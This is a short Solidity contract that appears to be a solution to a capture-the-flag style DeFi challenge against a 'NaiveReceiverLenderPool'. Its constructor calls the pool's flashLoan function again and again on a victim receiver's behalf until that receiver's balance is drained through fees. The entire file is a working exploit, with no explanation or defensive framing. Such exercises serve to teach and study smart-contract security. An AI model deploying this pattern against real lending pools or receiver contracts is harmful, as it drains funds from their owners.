pragma solidity ^0.6.0;

import "./NaiveReceiverLenderPool.sol";

contract FlashLoanAttacker {

    NaiveReceiverLenderPool pool;

    constructor(address payable poolAddress, address payable receiver) public {
        pool = NaiveReceiverLenderPool(poolAddress);

        while(receiver.balance > 0) {
            pool.flashLoan(receiver, 1);
        }
    }
}